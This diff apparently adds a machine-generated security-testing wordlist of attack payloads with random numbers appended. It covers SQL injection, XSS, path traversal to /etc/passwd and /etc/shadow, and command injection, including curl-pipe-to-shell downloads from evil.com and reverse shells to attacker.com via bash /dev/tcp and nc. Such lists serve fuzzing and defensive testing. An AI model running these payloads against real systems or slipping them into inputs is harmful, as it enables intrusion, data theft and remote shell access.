@@ -1,0 +1,1000 @@
+../../../../etc/passwd2410
+/etc/hosts5503
+<math href='javascript:alert(1)'>434
+/../../../var/www/html/config.php9719
+' OR benchmark(1000000,MD5(1))--8301
+`wget http://evil.com/shell.sh -O /tmp/shell.sh`8654
+' AND SLEEP(5)--1102
+' OR sleep(10)#3097
+<iframe src='javascript:alert(1)'></iframe>9146
+<svg/onload=fetch('http://evil.com')>6828
+/../../../var/www/html/config.php1762
+'; DROP TABLE users; --2357
+../../../../../../../../etc/shadow6468
+/../../../var/www/html/config.php6818
+`curl http://evil.com/shell.sh | sh`2827
+' OR 1=1 LIMIT 1 --73
+../../../../etc/passwd7648
+`wget http://evil.com/shell.sh -O /tmp/shell.sh`4207
+' AND SLEEP(5)--
+' AND ascii(substring((select database()),1,1))>64--539
+../../../../etc/passwd5482
+../../../../etc/passwd7584
+../../../../etc/passwd7305
+<svg/onload=alert('XSS')>2958
+`curl http://evil.com/shell.sh | sh`4404
+'; DROP TABLE users; --3706
+' OR '1'='1' /*889
+' OR benchmark(1000000,MD5(1))--5947
+/etc/hosts5320
+' AND ascii(substring((select database()),1,1))>64--3449
+' OR benchmark(1000000,MD5(1))--9352
+' OR sleep(10)#1358
+<math href='javascript:alert(1)'>5442
+/etc/issue2944
+/../../../var/www/html/config.php5056
+`bash -i >& /dev/tcp/attacker.com/1234 0>&1`7632
+' AND SLEEP(5)--3771
+' AND SLEEP(5)--1593
+<math href='javascript:alert(1)'>4936
+' AND ascii(substring((select database()),1,1))>64--2799
+/../../../var/www/html/config.php1723
+<body onload=alert('XSS')>3808
+<img src=x onerror=alert('XSS')>1918
+' OR 1=1 LIMIT 1 --2388
+<iframe src='javascript:alert(1)'></iframe>1240
+<details ontoggle=alert('XSS')><summary>Click me</summary></details>9020
+/../../../var/www/html/config.php4418
+' UNION SELECT NULL,NULL,NULL--3752
+`bash -i >& /dev/tcp/attacker.com/1234 0>&1`4261
+<details ontoggle=alert('XSS')><summary>Click me</summary></details>9503
+<img src=x onerror=console.log('test')>3851
+<details ontoggle=alert('XSS')><summary>Click me</summary></details>3921
+/etc/issue7952
+../../../../../../../../etc/shadow8104
+<img src=x onerror=console.log('test')>6445
+' OR 1=1 LIMIT 1 --7251
+' OR 1=1#654
+' AND SLEEP(5)--2102
+' AND ascii(substring((select database()),1,1))>64--1295
+' OR 1=1 LIMIT 1 --7615
+<img src=x onerror=console.log('test')>1273
+<math href='javascript:alert(1)'>6704
+/etc/hosts3586
+<math href='javascript:alert(1)'>3170
+<math href='javascript:alert(1)'>7038
+<img src=x onerror=console.log('test')>5419
+<math href='javascript:alert(1)'>9468
+../../../../../../../../etc/shadow5742
+<iframe src='javascript:alert(1)'></iframe>5396
+../../../../../../../../etc/shadow7583
+' AND ascii(substring((select database()),1,1))>64--3042
+../../../../etc/passwd5191
+' UNION SELECT NULL,NULL,NULL--3300
+' OR benchmark(1000000,MD5(1))--4190
+<iframe src='javascript:alert(1)'></iframe>410
+<body onload=alert('XSS')>9035
+' AND SLEEP(5)--8959
+<iframe src='javascript:alert(1)'></iframe>8881
+`bash -i >& /dev/tcp/attacker.com/1234 0>&1`786
+<body onload=alert('XSS')>4683
+`curl http://evil.com/shell.sh | sh`5933
+<iframe src='javascript:alert(1)'></iframe>1119
+../../../../etc/passwd8592
+<math href='javascript:alert(1)'>1857
+`bash -i >& /dev/tcp/attacker.com/1234 0>&1`386
+<img src=x onerror=alert('XSS')>3158
+<body onload=alert('XSS')>8452
+`curl http://evil.com/shell.sh | sh`9970
+' AND SLEEP(5)--2198
+<svg/onload=fetch('http://evil.com')>4999
+' OR benchmark(1000000,MD5(1))--4470
+`curl http://evil.com/shell.sh | sh`3824
+<img src=x onerror=console.log('test')>956
+<details ontoggle=alert('XSS')><summary>Click me</summary></details>9284
+../../../../etc/passwd6494
+<img src=x onerror=console.log('test')>2792
+' OR sleep(10)#5409
+/../../../var/www/html/config.php169
+`wget http://evil.com/shell.sh -O /tmp/shell.sh`82
+<img src=x onerror=console.log('test')>6475
+`wget http://evil.com/shell.sh -O /tmp/shell.sh`210
+<svg/onload=alert('XSS')>
+/etc/hosts9970
+<svg/onload=alert('XSS')>5333
+' AND SLEEP(5)--981
+<math href='javascript:alert(1)'>8574
+../../../../windows/win.ini2637
+' OR benchmark(1000000,MD5(1))--8252
+../../../../../../../../etc/shadow6184
+/etc/hosts2534
+<details ontoggle=alert('XSS')><summary>Click me</summary></details>6889
+<math href='javascript:alert(1)'>2064
+<img src=x onerror=console.log('test')>7351
+<svg/onload=alert('XSS')>9238
+../../../../../../../../etc/shadow385
+/etc/hosts7937
+<svg/onload=fetch('http://evil.com')>9147
+' OR 1=1 LIMIT 1 --4653
+<script>alert(1)</script>9145
+' UNION SELECT NULL,NULL,NULL--5468
+/etc/hosts3772
+../../../../etc/passwd3961
+' OR 1=1 LIMIT 1 --7821
+<details ontoggle=alert('XSS')><summary>Click me</summary></details>1477
+<math href='javascript:alert(1)'>2865
+`bash -i >& /dev/tcp/attacker.com/1234 0>&1`1840
+<img src=x onerror=alert('XSS')>6917
+' OR '1'='1' /*9314
+' OR 1=1 --9984
+' AND ascii(substring((select database()),1,1))>64--2178
+/etc/hosts622
+<svg/onload=alert('XSS')>6420
+`nc -e /bin/sh attacker.com 4444`2859
+' AND SLEEP(5)--7879
+' AND ascii(substring((select database()),1,1))>64--9387
+' OR 1=1 LIMIT 1 --4719
+<svg/onload=alert('XSS')>9861
+<iframe src='javascript:alert(1)'></iframe>4399
+<img src=x onerror=console.log('test')>2556
+<img src=x onerror=console.log('test')>2859
+' AND SLEEP(5)--9807
+../../../../windows/win.ini6059
+' AND SLEEP(5)--3942
+' UNION SELECT NULL,NULL,NULL--5658
+`wget http://evil.com/shell.sh -O /tmp/shell.sh`2564
+`nc -e /bin/sh attacker.com 4444`5272
+<details ontoggle=alert('XSS')><summary>Click me</summary></details>5757
+<img src=x onerror=alert('XSS')>1151
+<svg/onload=fetch('http://evil.com')>5346
+' OR benchmark(1000000,MD5(1))--8610
+' AND ascii(substring((select database()),1,1))>64--
+' AND ascii(substring((select database()),1,1))>64--7423
+../../../../etc/passwd3317
+`nc -e /bin/sh attacker.com 4444`7442
+`bash -i >& /dev/tcp/attacker.com/1234 0>&1`1122
+' OR sleep(10)#1245
+' AND SLEEP(5)--5093
+<iframe src='javascript:alert(1)'></iframe>8085
+`nc -e /bin/sh attacker.com 4444`3911
+`bash -i >& /dev/tcp/attacker.com/1234 0>&1`845
+<body onload=alert('XSS')>8325
+../../../../windows/win.ini398
+<math href='javascript:alert(1)'>9714
+' OR sleep(10)#
+/etc/issue7067
+/../../../var/www/html/config.php4049
+' OR 1=1#7330
+'; DROP TABLE users; --3824
+/etc/hosts1496
+' AND SLEEP(5)--5105
+' OR benchmark(1000000,MD5(1))--6198
+`nc -e /bin/sh attacker.com 4444`584
+' AND SLEEP(5)--8800
+`bash -i >& /dev/tcp/attacker.com/1234 0>&1`9195
+`wget http://evil.com/shell.sh -O /tmp/shell.sh`6460
+`wget http://evil.com/shell.sh -O /tmp/shell.sh`7908
+' OR 1=1 LIMIT 1 --5796
+<math href='javascript:alert(1)'>4994
+' AND SLEEP(5)--578
+`bash -i >& /dev/tcp/attacker.com/1234 0>&1`6687
+`bash -i >& /dev/tcp/attacker.com/1234 0>&1`8278
+<math href='javascript:alert(1)'>1751
+/../../../var/www/html/config.php9902
+' OR 1=1 LIMIT 1 --5285
+../../../../etc/passwd4088
+`curl http://evil.com/shell.sh | sh`1552
+' OR 1=1 LIMIT 1 --1372
+../../../../windows/win.ini6419
+../../../../windows/win.ini3135
+../../../../etc/passwd6410
+' AND ascii(substring((select database()),1,1))>64--5380
+' OR benchmark(1000000,MD5(1))--2253
+../../../../windows/win.ini4074
+<iframe src='javascript:alert(1)'></iframe>9859
+/etc/issue
+<img src=x onerror=alert('XSS')>4276
+/../../../var/www/html/config.php3183
+' OR 1=1 --9512
+<details ontoggle=alert('XSS')><summary>Click me</summary></details>2497
+`bash -i >& /dev/tcp/attacker.com/1234 0>&1`1995
+' OR '1'='1' /*4271
+<iframe src='javascript:alert(1)'></iframe>1851
+`nc -e /bin/sh attacker.com 4444`859
+<svg/onload=fetch('http://evil.com')>9214
+../../../../../../../../etc/shadow2696
+<body onload=alert('XSS')>923
+' OR 1=1#6882
+<details ontoggle=alert('XSS')><summary>Click me</summary></details>
+`bash -i >& /dev/tcp/attacker.com/1234 0>&1`5031
+' UNION SELECT NULL,NULL,NULL--8871
+' OR sleep(10)#2494
+/../../../var/www/html/config.php8001
+' OR benchmark(1000000,MD5(1))--2747
+`curl http://evil.com/shell.sh | sh`5181
+' OR '1'='1' /*717
+<iframe src='javascript:alert(1)'></iframe>2894
+' UNION SELECT NULL,NULL,NULL--2447
+'; DROP TABLE users; --9261
+`curl http://evil.com/shell.sh | sh`6493
+<math href='javascript:alert(1)'>9957
+/../../../var/www/html/config.php7158
+<svg/onload=fetch('http://evil.com')>4548
+`curl http://evil.com/shell.sh | sh`1848
+<math href='javascript:alert(1)'>6815
+' AND ascii(substring((select database()),1,1))>64--2496
+' OR 1=1 --7937
+<math href='javascript:alert(1)'>337
+<svg/onload=alert('XSS')>3136
+' OR '1'='1' /*5818
+`bash -i >& /dev/tcp/attacker.com/1234 0>&1`3923
+/../../../var/www/html/config.php9548
+' AND ascii(substring((select database()),1,1))>64--9880
+<math href='javascript:alert(1)'>2188
+<iframe src='javascript:alert(1)'></iframe>1855
+<svg/onload=fetch('http://evil.com')>4233
+' OR 1=1 --4784
+`bash -i >& /dev/tcp/attacker.com/1234 0>&1`7649
+'; DROP TABLE users; --6159
+' AND SLEEP(5)--7144
+<math href='javascript:alert(1)'>9010
+' OR 1=1 LIMIT 1 --5113
+<math href='javascript:alert(1)'>
+' OR 1=1 --1227
+`bash -i >& /dev/tcp/attacker.com/1234 0>&1`6770
+<math href='javascript:alert(1)'>2976
+<details ontoggle=alert('XSS')><summary>Click me</summary></details>7098
+' OR 1=1#7849
+<img src=x onerror=console.log('test')>2297
+' OR benchmark(1000000,MD5(1))--4501
+' AND SLEEP(5)--315
+<img src=x onerror=console.log('test')>257
+' OR sleep(10)#6826
+<iframe src='javascript:alert(1)'></iframe>4236
+' OR 1=1 LIMIT 1 --6354
+`curl http://evil.com/shell.sh | sh`1663
+<img src=x onerror=console.log('test')>1645
+<script>alert(1)</script>7003
+<svg/onload=alert('XSS')>8567
+../../../../etc/passwd2737
+' OR sleep(10)#931
+/etc/issue3061
+/etc/issue2717
+<img src=x onerror=console.log('test')>4992
+<math href='javascript:alert(1)'>6635
+/etc/hosts8877
+<script>alert(1)</script>6049
+/etc/issue2527
+../../../../windows/win.ini6162
+`nc -e /bin/sh attacker.com 4444`6485
+/../../../var/www/html/config.php8478
+<details ontoggle=alert('XSS')><summary>Click me</summary></details>1134
+`nc -e /bin/sh attacker.com 4444`422
+<svg/onload=fetch('http://evil.com')>4614
+<svg/onload=fetch('http://evil.com')>9664
+' OR 1=1 LIMIT 1 --
+../../../../../../../../etc/shadow9320
+/etc/hosts2769
+/etc/issue4403
+`nc -e /bin/sh attacker.com 4444`4784
+<img src=x onerror=alert('XSS')>1084
+`bash -i >& /dev/tcp/attacker.com/1234 0>&1`5653
+../../../../windows/win.ini3956
+../../../../etc/passwd1462
+<svg/onload=fetch('http://evil.com')>7868
+' OR benchmark(1000000,MD5(1))--5170
+`bash -i >& /dev/tcp/attacker.com/1234 0>&1`4740
+' UNION SELECT NULL,NULL,NULL--5029
+<iframe src='javascript:alert(1)'></iframe>4893
+<img src=x onerror=console.log('test')>1176
+'; DROP TABLE users; --1314
+<img src=x onerror=alert('XSS')>2123
+`wget http://evil.com/shell.sh -O /tmp/shell.sh`1736
+<math href='javascript:alert(1)'>8851
+../../../../windows/win.ini5506
+<math href='javascript:alert(1)'>2722
+' AND ascii(substring((select database()),1,1))>64--7801
+' UNION SELECT NULL,NULL,NULL--7290
+<img src=x onerror=console.log('test')>9870
+../../../../windows/win.ini2338
+' OR 1=1 --5983
+' AND SLEEP(5)--940
+/etc/issue3062
+<body onload=alert('XSS')>8717
+/etc/issue6105
+' OR benchmark(1000000,MD5(1))--8369
+<iframe src='javascript:alert(1)'></iframe>4081
+' OR sleep(10)#6907
+<img src=x onerror=alert('XSS')>1997
+<img src=x onerror=console.log('test')>4486
+`bash -i >& /dev/tcp/attacker.com/1234 0>&1`8025
+' OR '1'='1' /*9623
+' UNION SELECT NULL,NULL,NULL--8502
+/etc/issue3415
+<img src=x onerror=alert('XSS')>598
+'; DROP TABLE users; --6552
+`wget http://evil.com/shell.sh -O /tmp/shell.sh`9468
+../../../../windows/win.ini9921
+<svg/onload=fetch('http://evil.com')>
+/../../../var/www/html/config.php2428
+<img src=x onerror=alert('XSS')>896
+../../../../windows/win.ini9264
+' OR 1=1 --8618
+<body onload=alert('XSS')>5646
+<math href='javascript:alert(1)'>9287
+../../../../windows/win.ini3437
+<details ontoggle=alert('XSS')><summary>Click me</summary></details>8389
+`wget http://evil.com/shell.sh -O /tmp/shell.sh`7640
+<iframe src='javascript:alert(1)'></iframe>3281
+' AND ascii(substring((select database()),1,1))>64--6508
+' OR sleep(10)#7838
+<body onload=alert('XSS')>5833
+`nc -e /bin/sh attacker.com 4444`2960
+../../../../windows/win.ini657
+<img src=x onerror=alert('XSS')>6250
+' OR sleep(10)#2294
+<script>alert(1)</script>3850
+' OR benchmark(1000000,MD5(1))--8923
+`wget http://evil.com/shell.sh -O /tmp/shell.sh`4750
+`curl http://evil.com/shell.sh | sh`2093
+<svg/onload=fetch('http://evil.com')>3632
+/etc/hosts8840
+' AND SLEEP(5)--1254
+' OR 1=1 LIMIT 1 --3510
+' OR '1'='1' /*6063
+' OR 1=1 LIMIT 1 --5025
+/etc/issue3276
+' OR 1=1 LIMIT 1 --5047
+`nc -e /bin/sh attacker.com 4444`7340
+<img src=x onerror=alert('XSS')>6454
+../../../../../../../../etc/shadow8375
+<body onload=alert('XSS')>4509
+' OR sleep(10)#7590
+`curl http://evil.com/shell.sh | sh`6946
+<img src=x onerror=alert('XSS')>6189
+`bash -i >& /dev/tcp/attacker.com/1234 0>&1`741
+<svg/onload=alert('XSS')>5684
+<details ontoggle=alert('XSS')><summary>Click me</summary></details>3090
+' OR '1'='1' /*5502
+' UNION SELECT NULL,NULL,NULL--3840
+<svg/onload=alert('XSS')>5671
+<svg/onload=fetch('http://evil.com')>7429
+<details ontoggle=alert('XSS')><summary>Click me</summary></details>8053
+' AND SLEEP(5)--8384
+<math href='javascript:alert(1)'>6429
+' OR 1=1 --
+`bash -i >& /dev/tcp/attacker.com/1234 0>&1`3293
+<math href='javascript:alert(1)'>638
+' OR 1=1 LIMIT 1 --1109
+`wget http://evil.com/shell.sh -O /tmp/shell.sh`2678
+<math href='javascript:alert(1)'>6278
+' OR 1=1 --3375
+' OR benchmark(1000000,MD5(1))--3001
+/../../../var/www/html/config.php4211
+`wget http://evil.com/shell.sh -O /tmp/shell.sh`9318
+<svg/onload=fetch('http://evil.com')>9465
+../../../../etc/passwd7312
+' OR benchmark(1000000,MD5(1))--420
+<script>alert(1)</script>5613
+' AND SLEEP(5)--1859
+`wget http://evil.com/shell.sh -O /tmp/shell.sh`8865
+`wget http://evil.com/shell.sh -O /tmp/shell.sh`761
+' OR sleep(10)#6234
+<img src=x onerror=alert('XSS')>9378
+' OR sleep(10)#5593
+`nc -e /bin/sh attacker.com 4444`5795
+' OR '1'='1' /*7627
+<details ontoggle=alert('XSS')><summary>Click me</summary></details>834
+'; DROP TABLE users; --3248
+' OR 1=1#509
+' UNION SELECT NULL,NULL,NULL--8687
+<details ontoggle=alert('XSS')><summary>Click me</summary></details>3206
+' OR benchmark(1000000,MD5(1))--4628
+<svg/onload=fetch('http://evil.com')>5118
+`bash -i >& /dev/tcp/attacker.com/1234 0>&1`1542
+../../../../windows/win.ini3325
+<img src=x onerror=console.log('test')>2435
+' OR 1=1 LIMIT 1 --1468
+../../../../../../../../etc/shadow9191
+' OR benchmark(1000000,MD5(1))--201
+<iframe src='javascript:alert(1)'></iframe>7019
+/etc/issue4127
+<details ontoggle=alert('XSS')><summary>Click me</summary></details>391
+' OR '1'='1' /*7750
+<img src=x onerror=console.log('test')>1835
+<img src=x onerror=console.log('test')>
+' UNION SELECT NULL,NULL,NULL--6769
+' OR '1'='1' /*1910
+'; DROP TABLE users; --7709
+' OR sleep(10)#1138
+' AND ascii(substring((select database()),1,1))>64--6063
+' OR 1=1 LIMIT 1 --8785
+<body onload=alert('XSS')>
+' OR 1=1 LIMIT 1 --8379
+/../../../var/www/html/config.php6904
+`wget http://evil.com/shell.sh -O /tmp/shell.sh`1329
+<img src=x onerror=alert('XSS')>5785
+<iframe src='javascript:alert(1)'></iframe>6564
+' OR 1=1#4104
+<details ontoggle=alert('XSS')><summary>Click me</summary></details>5640
+<img src=x onerror=console.log('test')>7821
+' UNION SELECT NULL,NULL,NULL--2252
+<iframe src='javascript:alert(1)'></iframe>9806
+<img src=x onerror=console.log('test')>2791
+<svg/onload=alert('XSS')>9047
+' AND SLEEP(5)--9309
+' UNION SELECT NULL,NULL,NULL--6274
+' OR '1'='1' /*4407
+<math href='javascript:alert(1)'>8557
+<iframe src='javascript:alert(1)'></iframe>921
+../../../../../../../../etc/shadow9884
+`nc -e /bin/sh attacker.com 4444`3631
+../../../../windows/win.ini2755
+' OR sleep(10)#3001
+/etc/issue5404
+`nc -e /bin/sh attacker.com 4444`6475
+<svg/onload=alert('XSS')>3151
+' OR benchmark(1000000,MD5(1))--8096
+<svg/onload=fetch('http://evil.com')>2945
+' AND ascii(substring((select database()),1,1))>64--2481
+' OR sleep(10)#8102
+' OR 1=1 --4582
+../../../../windows/win.ini2922
+' OR benchmark(1000000,MD5(1))--9650
+<iframe src='javascript:alert(1)'></iframe>4050
+/../../../var/www/html/config.php7447
+/etc/issue5290
+<svg/onload=fetch('http://evil.com')>8894
+<details ontoggle=alert('XSS')><summary>Click me</summary></details>8607
+<math href='javascript:alert(1)'>4083
+<body onload=alert('XSS')>4155
+' OR sleep(10)#9938
+<img src=x onerror=alert('XSS')>7153
+'; DROP TABLE users; --7275
+<details ontoggle=alert('XSS')><summary>Click me</summary></details>7335
+' AND ascii(substring((select database()),1,1))>64--5252
+<img src=x onerror=console.log('test')>2180
+'; DROP TABLE users; --8995
+/../../../var/www/html/config.php7423
+../../../../../../../../etc/shadow3482
+'; DROP TABLE users; --1660
+`wget http://evil.com/shell.sh -O /tmp/shell.sh`243
+'; DROP TABLE users; --4798
+' OR sleep(10)#6729
+' OR sleep(10)#8680
+`bash -i >& /dev/tcp/attacker.com/1234 0>&1`7769
+<svg/onload=alert('XSS')>2249
+' OR 1=1#2612
+<details ontoggle=alert('XSS')><summary>Click me</summary></details>6776
+' OR sleep(10)#8045
+<iframe src='javascript:alert(1)'></iframe>
+`nc -e /bin/sh attacker.com 4444`8107
+' OR benchmark(1000000,MD5(1))--1246
+'; DROP TABLE users; --9845
+`bash -i >& /dev/tcp/attacker.com/1234 0>&1`
+<script>alert(1)</script>7430
+' OR sleep(10)#5255
+' OR 1=1 LIMIT 1 --2229
+<script>alert(1)</script>42
+' AND ascii(substring((select database()),1,1))>64--4631
+<svg/onload=fetch('http://evil.com')>1729
+<body onload=alert('XSS')>5430
+`nc -e /bin/sh attacker.com 4444`8537
+' OR '1'='1' /*4627
+' OR benchmark(1000000,MD5(1))--9640
+' OR 1=1#9965
+/../../../var/www/html/config.php2640
+<iframe src='javascript:alert(1)'></iframe>2367
+`nc -e /bin/sh attacker.com 4444`
+<details ontoggle=alert('XSS')><summary>Click me</summary></details>6524
+' OR 1=1#4272
+../../../../../../../../etc/shadow9234
+' OR 1=1#5525
+' OR sleep(10)#4214
+`curl http://evil.com/shell.sh | sh`6443
+' AND SLEEP(5)--5613
+' AND ascii(substring((select database()),1,1))>64--3470
+<img src=x onerror=alert('XSS')>4022
+' OR benchmark(1000000,MD5(1))--6383
+<img src=x onerror=alert('XSS')>6280
+' OR 1=1 LIMIT 1 --9618
+/etc/issue2705
+<body onload=alert('XSS')>9426
+../../../../etc/passwd2513
+`nc -e /bin/sh attacker.com 4444`4298
+<math href='javascript:alert(1)'>2505
+' AND ascii(substring((select database()),1,1))>64--1367
+`wget http://evil.com/shell.sh -O /tmp/shell.sh`9996
+`bash -i >& /dev/tcp/attacker.com/1234 0>&1`6441
+../../../../windows/win.ini9020
+/etc/issue8858
+' AND ascii(substring((select database()),1,1))>64--6368
+' OR benchmark(1000000,MD5(1))--308
+../../../../../../../../etc/shadow6121
+' OR 1=1 LIMIT 1 --7313
+<img src=x onerror=console.log('test')>5978
+/etc/issue7251
+/etc/hosts4842
+' AND ascii(substring((select database()),1,1))>64--3938
+<svg/onload=fetch('http://evil.com')>1887
+<details ontoggle=alert('XSS')><summary>Click me</summary></details>2874
+../../../../windows/win.ini675
+<img src=x onerror=console.log('test')>2996
+' OR 1=1 LIMIT 1 --2194
+<details ontoggle=alert('XSS')><summary>Click me</summary></details>3618
+/etc/issue7442
+<img src=x onerror=alert('XSS')>2395
+' AND ascii(substring((select database()),1,1))>64--7984
+`bash -i >& /dev/tcp/attacker.com/1234 0>&1`9490
+`bash -i >& /dev/tcp/attacker.com/1234 0>&1`1685
+<math href='javascript:alert(1)'>6361
+`nc -e /bin/sh attacker.com 4444`1345
+<body onload=alert('XSS')>9556
+<math href='javascript:alert(1)'>5884
+<svg/onload=fetch('http://evil.com')>5501
+' UNION SELECT NULL,NULL,NULL--8078
+<body onload=alert('XSS')>1379
+<body onload=alert('XSS')>9632
+../../../../../../../../etc/shadow4520
+' OR sleep(10)#6330
+<svg/onload=alert('XSS')>6011
+' OR 1=1 LIMIT 1 --23
+' OR benchmark(1000000,MD5(1))--2037
+' OR sleep(10)#752
+/etc/hosts6528
+<body onload=alert('XSS')>1147
+`curl http://evil.com/shell.sh | sh`6600
+' OR benchmark(1000000,MD5(1))--9649
+`bash -i >& /dev/tcp/attacker.com/1234 0>&1`2314
+../../../../windows/win.ini6663
+/../../../var/www/html/config.php3271
+`nc -e /bin/sh attacker.com 4444`1929
+<img src=x onerror=console.log('test')>9587
+`wget http://evil.com/shell.sh -O /tmp/shell.sh`2707
+`wget http://evil.com/shell.sh -O /tmp/shell.sh`392
+<svg/onload=fetch('http://evil.com')>5803
+<script>alert(1)</script>
+<img src=x onerror=alert('XSS')>1503
+<svg/onload=alert('XSS')>4829
+' OR 1=1 LIMIT 1 --1172
+<math href='javascript:alert(1)'>1529
+../../../../windows/win.ini2273
+<body onload=alert('XSS')>2999
+<img src=x onerror=alert('XSS')>4751
+<svg/onload=alert('XSS')>6197
+' AND ascii(substring((select database()),1,1))>64--2527
+<img src=x onerror=console.log('test')>643
+<img src=x onerror=alert('XSS')>1560
+'; DROP TABLE users; --953
+/../../../var/www/html/config.php4028
+/../../../var/www/html/config.php1462
+<script>alert(1)</script>9878
+' OR sleep(10)#2174
+<svg/onload=alert('XSS')>1004
+<details ontoggle=alert('XSS')><summary>Click me</summary></details>1526
+'; DROP TABLE users; --4621
+<script>alert(1)</script>947
+'; DROP TABLE users; --3435
+' OR 1=1 --233
+' OR 1=1 LIMIT 1 --3541
+' OR benchmark(1000000,MD5(1))--8956
+' OR benchmark(1000000,MD5(1))--7147
+' OR 1=1 LIMIT 1 --1955
+' AND SLEEP(5)--9647
+<svg/onload=alert('XSS')>9712
+`curl http://evil.com/shell.sh | sh`2915
+../../../../etc/passwd
+' OR sleep(10)#5289
+<math href='javascript:alert(1)'>3507
+`curl http://evil.com/shell.sh | sh`8868
+' OR 1=1#1516
+' OR 1=1 --6642
+/etc/hosts6492
+`curl http://evil.com/shell.sh | sh`9593
+' OR 1=1 LIMIT 1 --2557
+`curl http://evil.com/shell.sh | sh`2880
+/../../../var/www/html/config.php
+<iframe src='javascript:alert(1)'></iframe>1220
+<svg/onload=alert('XSS')>5729
+/etc/issue2381
+<body onload=alert('XSS')>7536
+' OR 1=1 LIMIT 1 --8724
+<details ontoggle=alert('XSS')><summary>Click me</summary></details>7869
+<svg/onload=alert('XSS')>4012
+' OR sleep(10)#5957
+`bash -i >& /dev/tcp/attacker.com/1234 0>&1`7657
+' OR sleep(10)#9805
+../../../../../../../../etc/shadow1611
+<script>alert(1)</script>93
+/etc/hosts5754
+../../../../etc/passwd4271
+' AND ascii(substring((select database()),1,1))>64--4682
+/../../../var/www/html/config.php6257
+<iframe src='javascript:alert(1)'></iframe>4661
+' OR benchmark(1000000,MD5(1))--
+/etc/hosts3640
+<iframe src='javascript:alert(1)'></iframe>6432
+../../../../../../../../etc/shadow5653
+' OR 1=1#8191
+<iframe src='javascript:alert(1)'></iframe>7831
+/etc/hosts947
+<script>alert(1)</script>4004
+`wget http://evil.com/shell.sh -O /tmp/shell.sh`4969
+' OR '1'='1' /*7921
+`curl http://evil.com/shell.sh | sh`4487
+' OR '1'='1' /*932
+' UNION SELECT NULL,NULL,NULL--9977
+<body onload=alert('XSS')>1876
+../../../../../../../../etc/shadow1818
+' OR 1=1#
+`curl http://evil.com/shell.sh | sh`2222
+<svg/onload=alert('XSS')>5841
+`wget http://evil.com/shell.sh -O /tmp/shell.sh`9173
+../../../../../../../../etc/shadow8006
+../../../../windows/win.ini3136
+`bash -i >& /dev/tcp/attacker.com/1234 0>&1`3742
+' OR '1'='1' /*6317
+../../../../../../../../etc/shadow7845
+<details ontoggle=alert('XSS')><summary>Click me</summary></details>1480
+/etc/hosts8213
+`nc -e /bin/sh attacker.com 4444`661
+' OR '1'='1' /*4747
+' OR '1'='1' /*3480
+' OR 1=1 --9092
+' OR sleep(10)#3023
+' AND ascii(substring((select database()),1,1))>64--878
+../../../../../../../../etc/shadow210
+<details ontoggle=alert('XSS')><summary>Click me</summary></details>2052
+<img src=x onerror=alert('XSS')>552
+<svg/onload=alert('XSS')>3000
+<details ontoggle=alert('XSS')><summary>Click me</summary></details>18
+/../../../var/www/html/config.php4198
+' OR 1=1#5912
+' AND SLEEP(5)--4198
+' OR 1=1#4457
+<svg/onload=alert('XSS')>3580
+' OR benchmark(1000000,MD5(1))--1875
+../../../../../../../../etc/shadow2646
+/etc/hosts6479
+' OR '1'='1' /*400
+`wget http://evil.com/shell.sh -O /tmp/shell.sh`1529
+<svg/onload=alert('XSS')>234
+../../../../../../../../etc/shadow9193
+<svg/onload=fetch('http://evil.com')>954
+<math href='javascript:alert(1)'>3244
+../../../../etc/passwd9197
+/etc/issue3321
+' AND SLEEP(5)--1071
+<details ontoggle=alert('XSS')><summary>Click me</summary></details>8703
+<img src=x onerror=alert('XSS')>2103
+' OR 1=1#8597
+' AND ascii(substring((select database()),1,1))>64--5790
+<details ontoggle=alert('XSS')><summary>Click me</summary></details>5970
+../../../../windows/win.ini4951
+<body onload=alert('XSS')>8665
+`curl http://evil.com/shell.sh | sh`5556
+' UNION SELECT NULL,NULL,NULL--999
+' OR sleep(10)#6228
+' UNION SELECT NULL,NULL,NULL--3133
+' OR 1=1 LIMIT 1 --7656
+' OR sleep(10)#985
+`nc -e /bin/sh attacker.com 4444`267
+<img src=x onerror=alert('XSS')>416
+<img src=x onerror=alert('XSS')>4701
+' OR 1=1 LIMIT 1 --7497
+`bash -i >& /dev/tcp/attacker.com/1234 0>&1`154
+/etc/issue2819
+<iframe src='javascript:alert(1)'></iframe>8636
+<img src=x onerror=console.log('test')>6176
+' OR 1=1 LIMIT 1 --1014
+<svg/onload=alert('XSS')>9442
+../../../../../../../../etc/shadow4816
+../../../../../../../../etc/shadow2110
+<script>alert(1)</script>4173
+<img src=x onerror=console.log('test')>2592
+' OR 1=1 LIMIT 1 --9368
+`curl http://evil.com/shell.sh | sh`9206
+<img src=x onerror=alert('XSS')>928
+../../../../etc/passwd256
+`wget http://evil.com/shell.sh -O /tmp/shell.sh`6796
+' AND ascii(substring((select database()),1,1))>64--6388
+<img src=x onerror=console.log('test')>6758
+' OR 1=1 LIMIT 1 --7890
+`curl http://evil.com/shell.sh | sh`6032
+'; DROP TABLE users; --5181
+<svg/onload=alert('XSS')>7257
+' OR 1=1 --3394
+`curl http://evil.com/shell.sh | sh`6310
+../../../../../../../../etc/shadow7605
+../../../../windows/win.ini3440
+' OR 1=1#9575
+/etc/hosts5348
+<script>alert(1)</script>2012
+' OR 1=1#9250
+`nc -e /bin/sh attacker.com 4444`6034
+' OR 1=1#6998
+/../../../var/www/html/config.php4197
+<iframe src='javascript:alert(1)'></iframe>6719
+<svg/onload=alert('XSS')>7024
+'; DROP TABLE users; --1007
+<details ontoggle=alert('XSS')><summary>Click me</summary></details>1383
+`bash -i >& /dev/tcp/attacker.com/1234 0>&1`4985
+' AND ascii(substring((select database()),1,1))>64--7534
+/etc/hosts5475
+' OR benchmark(1000000,MD5(1))--4481
+`wget http://evil.com/shell.sh -O /tmp/shell.sh`6750
+/../../../var/www/html/config.php5570
+' OR 1=1 LIMIT 1 --5079
+../../../../etc/passwd7022
+/etc/issue567
+<img src=x onerror=alert('XSS')>
+<details ontoggle=alert('XSS')><summary>Click me</summary></details>955
+<script>alert(1)</script>5768
+<script>alert(1)</script>6018
+<body onload=alert('XSS')>7894
+' OR benchmark(1000000,MD5(1))--8172
+`nc -e /bin/sh attacker.com 4444`4381
+' AND ascii(substring((select database()),1,1))>64--6968
+`curl http://evil.com/shell.sh | sh`2134
+../../../../etc/passwd4808
+<math href='javascript:alert(1)'>222
+<svg/onload=alert('XSS')>6398
+' OR 1=1 --9251
+../../../../etc/passwd9293
+../../../../etc/passwd9941
+' OR '1'='1' /*7664
+<iframe src='javascript:alert(1)'></iframe>9920
+../../../../etc/passwd9504
+<svg/onload=alert('XSS')>4085
+/etc/hosts4821
+<body onload=alert('XSS')>2483
+<body onload=alert('XSS')>7054
